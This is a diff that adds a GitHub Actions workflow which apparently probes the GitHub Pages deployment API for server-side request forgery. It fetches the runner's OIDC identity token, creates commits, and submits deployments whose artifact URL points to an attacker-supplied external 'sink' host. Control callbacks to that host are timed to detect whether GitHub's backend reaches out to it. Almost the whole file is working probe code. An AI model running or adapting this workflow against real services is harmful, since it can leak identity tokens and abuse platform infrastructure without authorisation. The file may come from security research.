@@ -1,0 +1,55 @@
+name: reacharm4
+on:
+  workflow_dispatch:
+    inputs:
+      sink: { required: true }
+permissions: { contents: write, pages: write, id-token: write, actions: write }
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: { name: github-pages }
+    steps:
+      - run: |
+          mkdir -p s && echo '<h1>ok</h1>' > s/index.html
+          tar -cf artifact.tar -C s .        # WELL-FORMED: what Pages expects
+          tar -czf art.tar.gz  -C s .        # MALFORMED:  gzipped, wrong name
+      - uses: actions/upload-artifact@v4
+        with: { name: good, path: artifact.tar }
+      - uses: actions/upload-artifact@v4
+        with: { name: bad,  path: art.tar.gz }
+      - name: arms
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SINK: ${{ inputs.sink }}
+        run: |
+          set -u
+          R=$GITHUB_REPOSITORY; A=https://api.github.com
+          API="$A/repos/$R/pages/deployments"
+          H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
+          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          echo "PRECONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-PRE4")"
+          curl -s "${H[@]}" "$A/repos/$R/actions/runs/$GITHUB_RUN_ID/artifacts" > arts.json
+          IDG=$(jq -r '.artifacts[]|select(.name=="good").id' arts.json)
+          IDB=$(jq -r '.artifacts[]|select(.name=="bad").id' arts.json)
+          echo "IDS good=$IDG bad=$IDB"
+          mk(){ curl -s "${H[@]}" -X PUT "$A/repos/$R/contents/m4/$1.txt" \
+                 -d "$(jq -nc --arg m "m $1" --arg c "$(echo -n "$1-$GITHUB_RUN_ID"|base64 -w0)" '{message:$m,content:$c}')" \
+                 | jq -r '.commit.sha'; }
+          run_arm(){ # $1=label $2=artifact_id $3=sha
+            echo "===== ARM $1 (artifact_id=$2) ====="
+            jq -nc --argjson id "$2" --arg u "$SINK/ARM-$1" --arg s "$3" --arg t "$T" \
+              '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > $1.json
+            ST=$(date +%s)
+            echo "${1}_HTTP=$(curl -s -o $1.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @$1.json)"
+            echo "${1}_DEPLOYMENT_ID=$(jq -r '.id//"NONE"' $1.out)"
+            SU=$(jq -r '.status_url//empty' $1.out)
+            for i in $(seq 1 16); do sleep 10
+              S=$(curl -s "${H[@]}" "$SU" | jq -r '.status')
+              case "$S" in deployment_in_progress|deployment_queued|null|"") ;;
+                *) echo "${1}_TERMINAL=$S ELAPSED=$(( $(date +%s) - ST ))s"; return;; esac
+            done; echo "${1}_TERMINAL=TIMEOUT ELAPSED=$(( $(date +%s) - ST ))s"; }
+
+          # CONTROL FIRST, then the test -- so a callback on the test cannot be explained by arm position.
+          run_arm GOOD "$IDG" "$(mk good)"
+          run_arm BAD  "$IDB" "$(mk bad)"
+          echo "POSTCONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-POST4")"
